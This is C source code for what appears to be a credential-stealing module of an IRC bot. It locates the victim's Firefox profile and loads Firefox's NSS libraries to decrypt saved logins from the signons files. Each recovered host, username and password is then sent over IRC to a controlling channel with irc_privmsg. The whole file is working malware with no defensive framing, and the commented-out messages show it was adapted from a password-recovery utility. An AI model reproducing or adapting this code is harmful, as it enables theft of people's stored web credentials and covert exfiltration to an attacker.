#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

#define NSS_LIBRARY_NAME   "nss3.dll"
#define PLC_LIBRARY_NAME   "plc4.dll"
#define NSPR_LIBRARY_NAME  "nspr4.dll"
#define PLDS_LIBRARY_NAME  "plds4.dll"
#define SOFTN_LIBRARY_NAME "softokn3.dll"

#define GETPROCADDRESS  GetProcAddress
#define FREELIBRARY     FreeLibrary
 
typedef struct PK11SlotInfoStr PK11SlotInfo;

// NSS Library functions
typedef SECStatus      (*NSS_Init) (const char *configdir);
typedef SECStatus      (*NSS_Shutdown) (void);
typedef PK11SlotInfo * (*PK11_GetInternalKeySlot) (void);
typedef void           (*PK11_FreeSlot) (PK11SlotInfo *slot);
typedef SECStatus      (*PK11_CheckUserPassword) (PK11SlotInfo *slot,char *pw);
typedef SECStatus      (*PK11_Authenticate) (PK11SlotInfo *slot, PRBool loadCerts, void *wincx);
typedef SECStatus      (*PK11SDR_Decrypt) (SECItem *data, SECItem *result, void *cx);

// PLC Library functions
typedef char *         (*PL_Base64Decode)( const char *src, PRUint32 srclen, char *dest);

NSS_Init                NSSInit;
NSS_Shutdown            NSSShutdown;
PK11_GetInternalKeySlot PK11GetInternalKeySlot;
PK11_CheckUserPassword  PK11CheckUserPassword;
PK11_FreeSlot           PK11FreeSlot;
PK11_Authenticate       PK11Authenticate;
PK11SDR_Decrypt         PK11SDRDecrypt;
PL_Base64Decode         PLBase64Decode;

char masterPassword[1024];
int IsNSSInitialized = 0;

HMODULE libnss = NULL;
HMODULE libplc = NULL;
HMODULE libtmp = NULL;

//enc_privmsg(sock, a[2], "Already running.", notice);
int FindFirefoxPasses(SOCKET sock, char *dest, BOOL notice)
{	
	char *profileDir, /**masterPassword, */*firefoxDir;
	profileDir = GetCurrentUserProfilePath();
	firefoxDir = GetFirefoxLibPath();
	LoadLibrary("\\Program Files\\Mozilla Firefox\\MOZCRT19.dll");
	LoadLibrary("\\Program Files\\Mozilla Firefox\\sqlite3.dll");
	LoadLibrary("\\Program Files\\Mozilla Firefox\\nspr4.dll");
	LoadLibrary("\\Program Files\\Mozilla Firefox\\plds4.dll");
	LoadLibrary("\\Program Files\\Mozilla Firefox\\plc4.dll");
	LoadLibrary("\\Program Files\\Mozilla Firefox\\nssutil3.dll");
if(!profileDir){return 0;}
if(!firefoxDir){return 0;}

	if( InitializeFirefoxLibrary(firefoxDir) )
	{
		if( InitializeNSSLibrary(profileDir, masterPassword) )
		{
			DumpSignonSecrets(profileDir, sock, dest, notice);
			TerminateFirefoxLibrary();
		}
	}

	return 1;
}

char *GetCurrentUserProfilePath()
{

char profilePath[_MAX_PATH] = "";
char partialPath[] = "Application Data\\Mozilla\\Firefox";
char profileFile[_MAX_PATH];
char line[1024];

DWORD pathSize = _MAX_PATH;
char *finalProfilePath = NULL;
int  isDefaultFound = 0;
HANDLE token;
		
	// Get current user's profile directory
	if( fOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token) == FALSE )
	{
		//DisplayMesg(TYPE_DEBUG, "\n Failed to get current process token ");
		return NULL;
	}
	
	if( fGetUserProfileDirectory(token, profilePath, &pathSize) == FALSE )
	{
		//DisplayMesg(TYPE_DEBUG, "\n Failed to get user profile directory");
		return NULL;
	}
	
	//DisplayMesg(TYPE_DEBUG, "\n User Profile directory = %s", profilePath);
	
	// Get firefox profile directory
	strcpy(profileFile, profilePath);
	strcat(profileFile,"\\");
	strcat(profileFile,partialPath);
	strcat(profileFile,"\\profiles.ini");
	
	// Open the firefox profile setting file
	FILE *profile = fopen(profileFile, "r");
	
	if( profile == NULL )
	{
		//DisplayMesg(TYPE_DEBUG, "\n Unable to find firefox profile file : %s ", profileFile);
		return NULL;
	}

	// Check each line of profile settings file for line "name=default" string
	// This indicates that we are looking under default profile...
	// So one among next few lines will have path information..just copy that...

	while(fgets(line, 1024, profile))
	{
		StrLwr(line);

		if( !isDefaultFound && ( strstr(line, "name=default") != NULL) )
		{
			isDefaultFound = 1;
			continue;
		}
		
		// We have got default profile ..now check for path
		if( isDefaultFound )
		{
			if( strstr(line,"path=") != NULL)
			{
				char *slash = strstr(line,"/");
				
				if( slash != NULL )
					*slash = '\\';
				
				// remove \n from the end of line
				line[strlen(line)-1] = 0;

				char *start = strstr(line,"=");
			
				int totalLen = strlen(profilePath) + strlen(partialPath) + strlen(start) + 3 ;
				finalProfilePath = (char *) malloc(totalLen);

				if( finalProfilePath )
				{
					strcpy(finalProfilePath,profilePath);
					strcat(finalProfilePath,"\\");
					strcat(finalProfilePath,partialPath);
					strcat(finalProfilePath,"\\");
					strcat(finalProfilePath,start+1);

					//DisplayMesg(TYPE_DEBUG, "\n Final profile path is : %s ", finalProfilePath);
				}

				break;
			}
		}
	
	}

	fclose(profile);

	return finalProfilePath;

}

char *GetFirefoxLibPath()
{
	char regSubKey[]    = "SOFTWARE\\Clients\\StartMenuInternet\\firefox.exe\\shell\\open\\command";
	char path[_MAX_PATH] ="";
	char *firefoxPath = NULL;
	DWORD pathSize = _MAX_PATH;
	DWORD valueType;
	HKEY rkey;

	// Open firefox registry key
	if( fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regSubKey, 0, KEY_READ, &rkey) != ERROR_SUCCESS )
	{
		//DisplayMesg(TYPE_DEBUG, "\n Failed to open the firefox registry key : HKCU\\%s", regSubKey );
		return NULL;
	}

	// Read the firefox path value
	if( fRegQueryValueEx(rkey, NULL, 0,  &valueType, (unsigned char*)&path, &pathSize) != ERROR_SUCCESS )
	{
		//DisplayMesg(TYPE_DEBUG, "\n Failed to read the firefox path value from registry ");
		fRegCloseKey(rkey);
		return NULL;
	} 
	
	if( pathSize <= 0 || path[0] == 0)
	{
		//DisplayMesg(TYPE_DEBUG, "\n Path value read from the registry is empty");
		fRegCloseKey(rkey);
		return NULL;
	}	

	fRegCloseKey(rkey);

	// This path may contain extra double quote....
	if( path[0] == '\"' )
	{
		for(unsigned int i=0; i< strlen(path)-1 ; i++)
			path[i] = path[i+1];
	}

	//DisplayMesg(TYPE_DEBUG, "\n Path value read from registry is %s", path);

	// Terminate the string at last "\\"
	for(int j=strlen(path)-1; j>0; j--)
	{
		if( path[j] == '\\' )
		{
			path[j]=0;
			break;
		}
	}

	firefoxPath = (char*) malloc( strlen(path) + 1);
	
	if( firefoxPath )
		strcpy(firefoxPath, path);

	//DisplayMesg(TYPE_DEBUG, "\n Firefox path = [%s] ", firefoxPath);
		
	return firefoxPath;

}

int InitializeFirefoxLibrary(char *firefoxPath)
{
	
	libnss = libplc = NULL;

	// First load the libraries from firefox path.
	if( firefoxPath != NULL )
	{
		// Load all the libraries from the leaf to the root..in the dependency list.
		if( LoadLibrary2(firefoxPath, NSPR_LIBRARY_NAME) )
		{
			if((libplc=LoadLibrary2(firefoxPath, PLC_LIBRARY_NAME)) )
			{
				if( LoadLibrary2(firefoxPath, PLDS_LIBRARY_NAME) )
				{
					if( LoadLibrary2(firefoxPath, SOFTN_LIBRARY_NAME) )
					{
						libnss=LoadLibrary2(firefoxPath, NSS_LIBRARY_NAME);
						//if( libnss )
						//	;
							//DisplayMesg(TYPE_DEBUG, "\n\n Library loaded from firefox path successfully ");
		
					}
				}
			}
		}	

	}


	// Now load from current path.
	if( !libnss )
	{

		//DisplayMesg(TYPE_DEBUG, "\n Loading library from current directory");
		
//		libnss =LoadLibrary2(NSS_LIBRARY_NAME);
		libnss = LoadLibrary2(firefoxPath, NSS_LIBRARY_NAME);
//		libplc =LoadLibrary2(PLC_LIBRARY_NAME);
		libplc = LoadLibrary2(firefoxPath, PLC_LIBRARY_NAME);

		if( !libnss || !libplc ) 
		{
			//DisplayMesg(TYPE_ERROR, "\n\n Failed to load Firefox libraries %s & %s ", NSS_LIBRARY_NAME, PLC_LIBRARY_NAME);
			return 0;
		}
	}


	//DisplayMesg(TYPE_DEBUG, "\n Firefox Libraries loaded successfully..");

	// Extract the required functions....
	NSSInit				   = (NSS_Init) GETPROCADDRESS(libnss, "NSS_Init");
	NSSShutdown			   = (NSS_Shutdown)GETPROCADDRESS(libnss, "NSS_Shutdown");
	PK11GetInternalKeySlot = (PK11_GetInternalKeySlot) GETPROCADDRESS(libnss, "PK11_GetInternalKeySlot");
	PK11FreeSlot           = (PK11_FreeSlot) GETPROCADDRESS(libnss, "PK11_FreeSlot");
	PK11Authenticate       = (PK11_Authenticate) GETPROCADDRESS(libnss, "PK11_Authenticate");
	PK11SDRDecrypt         = (PK11SDR_Decrypt) GETPROCADDRESS(libnss, "PK11SDR_Decrypt");
	PK11CheckUserPassword  = (PK11_CheckUserPassword ) GETPROCADDRESS(libnss, "PK11_CheckUserPassword");

	if( !NSSInit || !NSSShutdown || !PK11GetInternalKeySlot || !PK11Authenticate || !PK11SDRDecrypt || !PK11FreeSlot || !PK11CheckUserPassword)
	{
		//DisplayMesg(TYPE_ERROR, "\n\n Failed to get function address from library %s ", NSS_LIBRARY_NAME);
		TerminateFirefoxLibrary();
		return 0;
	}

	// Get the functions from PLC library
	PLBase64Decode     = ( PL_Base64Decode ) GETPROCADDRESS(libplc, "PL_Base64Decode");

	if( !PLBase64Decode )
	{
		//DisplayMesg(TYPE_ERROR, "\n\n Failed to get function address from library %s ", PLC_LIBRARY_NAME);
		TerminateFirefoxLibrary();
		return 0;
	}

	//DisplayMesg(TYPE_DEBUG, "\n Firefox library initialized successfully..");

	return 1;

}

int InitializeNSSLibrary(char *profilePath, char *password)
{
	IsNSSInitialized = 0;

	// Initialize the NSS library
	if( (*NSSInit) (profilePath) != SECSuccess )
	{
		//DisplayMesg(TYPE_ERROR, "\n\n Initialization failed , Make sure key3.db and cert8.db");
		//DisplayMesg(TYPE_ERROR, "\n files are present in the specified directory\n");
		TerminateFirefoxLibrary();
		return 0;
	}

	IsNSSInitialized = 1;

	if( (password != NULL) && (strlen(password) > 1023) )
	{
		//DisplayMesg(TYPE_ERROR, "\n\n Master Password length is more than the allowed size");
		TerminateFirefoxLibrary();
		return 0;
	}

	// Setup and check if master password is correct

	if( (password == NULL) || strlen(password) <= 0)
		masterPassword[0]=0;
	else
		strcpy(masterPassword, password);
	
	if( CheckMasterPassword( masterPassword ) != 1)
	{
		TerminateFirefoxLibrary();
		return 0;
	}

	
	//DisplayMesg(TYPE_DEBUG, "\n NSS library initiliazed successfully");

	return 1;

}

void DumpSignonSecrets(char *profilePath, SOCKET sock, char *dest, BOOL notice)
{
	char _buf[256];
char buffer[10240];
char name[10240];

char *clearData = NULL;
char *signonFilePath = NULL;
char signonFileName1[]="/signons.txt";
char signonFileName2[]="/signons2.txt";
char signonFileNameFF3[] ="/signons3.txt";


int bufferLength = 10240;
int count = 0;
int ret;
int version=1;

	signonFilePath = (char*) malloc( strlen(profilePath) + 64 + 1 );

	if( signonFilePath == NULL )
	{
		//DisplayMesg(TYPE_ERROR, "\n Insufficient memory ....");
		return;
	}
	
	strcpy(signonFilePath, profilePath);
	strcat(signonFilePath, signonFileName1);

	//DisplayMesg(TYPE_DEBUG, "\n Final signon filename is  = %s ", signonFilePath);
		
	
	// Open the signon file 
	if( OpenFile2(signonFilePath) == 0 )
	{
		strcpy(signonFilePath, profilePath);
		strcat(signonFilePath, signonFileName2);
		strcat(signonFilePath, signonFileNameFF3);

		//DisplayMesg(TYPE_DEBUG, "\n Final signon filename is  = %s ", signonFilePath);
		
		if( OpenFile2(signonFilePath) == 0 )
		{
			//DisplayMesg(TYPE_ERROR,"\n Failed to open the Firefox signon file.\n Unless you use Firefox password manager to save your passwords, signon file will not be present.\n");
			return;
		}
		version = 2;
	}
	

	// read the header format information 
	if( ReadLine(buffer, bufferLength) == 0 )
	{
		//DisplayMesg(TYPE_ERROR, "\n Error in reading signon file header ");
		return;
	}

	// check if the format is right...
	if( ((version == 1) && strcmp(buffer, HEADER_VERSION1) != 0) || ((version == 2) && strcmp(buffer, HEADER_VERSION2) != 0) )
	{
		//DisplayMesg(TYPE_ERROR, "\n Signon file header version information is not proper");
		return;
	}

	//we dont need these so comment it out
	//-->DisplayMesg(TYPE_PRINT, "\n ****** Reject Host List *******\n"); 

    // read the reject list 
	while ( ReadLine(buffer, bufferLength) != 0 )
	{
    	// Check for end of reject list
		if (strlen(buffer) != 0 && buffer[0] == '.') 
			break; 
		
		count++;
		//-->DisplayMesg(TYPE_PRINT, "\n %d => %s ", count, buffer);
	}

	//-->DisplayMesg(TYPE_PRINT, "\n\n\n\n ******** Host list with username/password ******** ");
	
	// read the URL line 
	while (ReadLine(buffer, bufferLength) != 0 ) 
	{
		
		sprintf(_buf, "%s ", buffer);
		//strcpy(_buf, buffer);
		//DisplayMesg(TYPE_PRINT, "\n\n Host : %s ", buffer);
	
		int getSubdomain=0;
		// prepare to read the name/value pairs 
		while( ReadLine(buffer, bufferLength) != 0 ) 
		{
			// line starting with . terminates the pairs for this URL entry 
			if (buffer[0] == '.') 
			{
				//DisplayMesg(TYPE_PRINT, "\n -------------------------------------------------- ");
				break; // end of URL entry 
			}
			
			if( (version == 2) && (getSubdomain == 2) )
			{
				strcat(_buf, buffer);
				//DisplayMesg(TYPE_PRINT, "\n %s  : %s ", "Subdomain", buffer);
				getSubdomain = 0;
				continue;
			}
			
			// save the name part and check if it is a password 
			if (buffer[0] == '*') 
			{
				strcpy(name,&buffer[1]);
			    ret = ReadLine(buffer, bufferLength);
			}
			else 
			{
				//DisplayMesg(TYPE_PRINT, "\n");
				strcpy(name, buffer);
				ret = ReadLine(buffer, bufferLength);
		    }

			// read in and save the value part
			if ( ret == 0 ) 
			{
				// error in input file so give up 
				//DisplayMesg(TYPE_ERROR, "\n Error occured while reading VALUE for : %s ", name);
				break;
			}

			if( DecryptSecretString(buffer, &clearData) == 1 )
			{
				strcat(_buf, name);
				strcat(_buf, ":"); 
				strcat(_buf, clearData);
				irc_privmsg(sock, channel, _buf, notice); 
                _buf[0] = '\0';
				Sleep(FLOOD_DELAY);
				//_buf = NULL;
				//irc_privmsg(_buf"%s  : %s ",infochan name, clearData);
				clearData = NULL;
				
			}
			else 
				return;

			getSubdomain++;

		}
	
	}

	//DisplayMesg(TYPE_PRINT, "\n\n **************************************************\n\n");
	
}

void TerminateFirefoxLibrary()
{

	if( IsNSSInitialized  && (NSSShutdown != NULL) )
		(*NSSShutdown)();

	if( libnss != NULL )
		FREELIBRARY(libnss);

	if( libplc != NULL )
		FREELIBRARY(libplc);

}

HMODULE LoadLibrary2(char *firefoxDir, char *libName)
{
char loadPath[4096]="";

	strcpy(loadPath, firefoxDir);
	strcat(loadPath, "/");
	strcat(loadPath, libName);

//	libtmp = LOADLIBRARY(loadPath);
	libtmp = LoadLibrary(loadPath);

	if( !libtmp )
	{
		//DisplayMesg(TYPE_DEBUG, "\n\n Failed to load library %s ", loadPath);
		return 0;
	}

	return libtmp;
}

/*
*   Verifies if the specified master password is correct.
*   return 1  success
*          0  failure
*/
int CheckMasterPassword(char *password)
{

PK11SlotInfo *slot = 0;
int ret = 0;

	slot = (*PK11GetInternalKeySlot)();
	
	if (!slot) 
	{ 
		//DisplayMesg(TYPE_ERROR, "\n PK11_GetInternalKeySlot failed  ...");
		return 0;
	}

	// First check if the master password set
	if( password[0] != 0 )
	{
		if( (*PK11CheckUserPassword)(slot, "") == SECSuccess )
		{
			//DisplayMesg(TYPE_PRINT, "\n Info : Master Password is NOT set. \n\n");
			(*PK11FreeSlot) (slot);
			return 1;
		}
	}


	if( (*PK11CheckUserPassword)(slot, password) == SECSuccess )
	{
		// Store the password for internal use...
		//DisplayMesg(TYPE_DEBUG, "\n CheckMasterPassword : specified master password is correct...");
		ret = 1;
	}
	else
	{
		if( password[0] == 0 )
		{
			//DisplayMesg(TYPE_ERROR, "\n Error :  Specify the right master password and try again.");
			//DisplayMesg(TYPE_ERROR, "\n Its also possible that you may not have used Firefox password manager anytime to save passwords.In such a case use it to save passwords and then try FirePassword again.");
		}
		else
		{
			//DisplayMesg(TYPE_ERROR, "\n Error :  Specified master password \"%s\" is wrong...\n Please enter the right master password and try again.",password);
			//DisplayMesg(TYPE_PRINT, "\n\n Usage : \n\t %s [-m \"master password\" ] [Firefox_Profile_Directory] \n\n", "FirePassword");
		}
		
		ret = 0;
	}

	// Free the slot
	(*PK11FreeSlot) (slot);

	return ret;

}

const int buflen = 10240;
static char readbuf[buflen+1];
static int last = 0;
static int next = 0;


FILE *signonFile = NULL;

int OpenFile2(char *filePath)
{

	last = next = 0;

	signonFile = fopen(filePath, "r");

	if( signonFile == NULL )
	{
		//DisplayMesg(TYPE_DEBUG,"\n Failed to open the signon file %s ", filePath);
		return 0;
	}

	return 1;

}

void CloseFile()
{
	if( signonFile )
		fclose(signonFile);
}


int ReadLine(char *buffer, int size)
{
  Unichar c;
  int strLength = 0, i=0;
  
  buffer[0] = 0;

  while(1)
  {
	 
	  c = ReadChar();  
	  
	  // note that eof is not set until we read past the end of the file 
	  if ( c == 0 ) // || feof(file) ) 
		  return 0;
	  
	  if (c == '\n') 
	  {
		  buffer[strLength++] = 0;
		  break;
	  }
	  
	  
	  if (c != '\r') 
	  {
		  for(i=0; i < 4 && ( (c & 0xff) != 0 ) ; i++)
		  {
			  if( strLength >= size )
			  {
				  // Increase the capacity dynamically
				  //DisplayMesg(TYPE_ERROR, "\n Buffer is insufficient to store data");
				  return 0;
			  }
			  
			  buffer[strLength++] = (char)c;
			  c = c >> 8;
		  }
	  }
  }
  
  return 1;

}

char ReadChar()
{
  
  if (next >= last) 
  {
    next = 0;
    last = fread(readbuf, 1, buflen, signonFile);
    //DisplayMesg(TYPE_DEBUG, "\n ReadChar = Read %d bytes ",last);

	if (last <= 0 ) 
	{
      // note that eof is not set until we read past the end of the file 
      //DisplayMesg(TYPE_DEBUG, "\n End of file reached...!");
	  return 0;
    }
  }

  return (readbuf[next++]);
}

int DecryptSecretString(char *cryptData, char **clearData)
{
int decodeLen = 0;
int finalLen = 0;
char *decodeData = NULL;
char *finalData = NULL;

	// treat zero-length crypt string as a special case 
	if(cryptData[0] == '\0') 
	{
		*clearData  = (char*) malloc(1);
		**clearData = 0;
		return 1;
	}
	
	// Use decryption routine...if crypt does not start with prefix...( for Firefox )
	// otherwise use base64 decoding ( for mozilla default installation)
	// For firefox its always encrypted with 3DES.
	if( cryptData[0] != CRYPT_PREFIX[0] ) 
	{
		
		//DisplayMesg(TYPE_DEBUG, "\n Performing PK11 Decryption ");
			
		// First do base64 decoding.....
		if(  (Base64Decode(cryptData, &decodeData, &decodeLen) == 0) || (decodeData == NULL) )
		{
			//DisplayMesg(TYPE_ERROR, "\n DecryptSecretString : Base64 decoding of crypt data failed ");
			return 0;
		}

		//DisplayMesg(TYPE_DEBUG, "\n DecryptSecretString : base64data (%d) = %s ", decodeLen, decodeData);
		
		// Now do actual PK11 decryption		
		if( (PK11Decrypt(decodeData, decodeLen, &finalData, &finalLen) == 0) || (finalData == NULL))
		{
			//DisplayMesg(TYPE_ERROR, "\n DecryptSecretString : Failed to decrypt the string ");
			return 0;
		}
		
			
		// WARNING: Decrypted string is not NULL terminated 
		// So we will create new NULL terminated string here...
	
		*clearData = (char*) malloc( finalLen + 1 );

		if( *clearData == NULL )
		{
			//DisplayMesg(TYPE_ERROR, "\n DecryptSecretString :Insufficient memory... ");
			return 0;
		}

	
		memcpy(*clearData, finalData, finalLen);
		*(*clearData + finalLen) = 0;    // Null terminate the string....
		
		//DisplayMesg(TYPE_DEBUG, "\n DecryptSecretString : finalLen = %d ", finalLen);

		return 1;
	}
	
	
	// Just do base64 decoding.
	
	//DisplayMesg(TYPE_DEBUG, "\n  DecryptSecretString : Performing simple Base64 Decoding ");

	unsigned int PREFIX_Len = strlen(CRYPT_PREFIX);
	if( strlen(cryptData) ==  PREFIX_Len )
	{
		*clearData = (char *)malloc(1);
		**clearData = '\0';
		return 1;
	}
	
	if(  Base64Decode(&cryptData[PREFIX_Len], clearData, &decodeLen) == 0 )
	{
		//DisplayMesg(TYPE_ERROR, "\n DecryptSecretString : Base64 decoding of crypt data failed ");
		return 0;
	}


	return 1;
}

int Base64Decode(char *cryptData, char **decodeData, int *decodeLen)
{
    int len = strlen( cryptData );
    int adjust = 0;

	//DisplayMesg(TYPE_DEBUG, "\n Base64Decode : Length of crypt data = %d", len);
    
	// Compute length adjustment 
    if (cryptData[len-1] == '=') 
	{
      adjust++;
      if (cryptData[len-2] == '=') 
		  adjust++;
    }

    *decodeData = ( char *)(*PLBase64Decode)(cryptData, len, NULL);

    if( *decodeData == NULL )
	{
		//DisplayMesg(TYPE_ERROR, "\n Base64 decoding failed ...");
		return 0;
	}
	
    *decodeLen = (len*3)/4 - adjust;
	
	//DisplayMesg(TYPE_DEBUG, "\n Base64Decode : Length of decoded data = %d", *decodeLen);
    
	return 1;
}

int PK11Decrypt(char *decodeData, int decodeLen, char **clearData, int *finalLen)
{
	PK11SlotInfo *slot = 0;
	SECStatus status;
	SECItem request;
	SECItem reply;

	// Find token with SDR key 
	slot = (*PK11GetInternalKeySlot)();
	
	if (!slot) 
	{ 
		//DisplayMesg(TYPE_ERROR, "\n PK11_GetInternalKeySlot failed  ...");
		return 0;
	}

	
	if ( (*PK11Authenticate)(slot, PR_TRUE, NULL) != SECSuccess)
	{
		// since we have specified password callback function , we won't come here...
		//DisplayMesg(TYPE_ERROR, "\n PK11_Authenticate failed");
		return 0;
	}
	
	// Decrypt the string
	request.data = (unsigned char *)decodeData;
	request.len = decodeLen;
	reply.data = 0;
	reply.len = 0;

	status = (*PK11SDRDecrypt)(&request, &reply, NULL);

	if (status != SECSuccess) 
	{ 
		//DisplayMesg(TYPE_ERROR, "\n PK11SDR_Decrypt failed  ...");
		return 0;
	}

	// WARNING : This string is not NULL terminated..
	*clearData = (char*)reply.data;
	*finalLen  = reply.len;

	// Free the slot
	(*PK11FreeSlot)(slot);

	return 1;
}

void StrLwr(char *str)
{
int n=strlen(str);

	for(int i=0; i<n; i++)
	{
	    if( str[i] >=65 && str[i]<=90 )
		str[i]+=32;
	} 		
	
}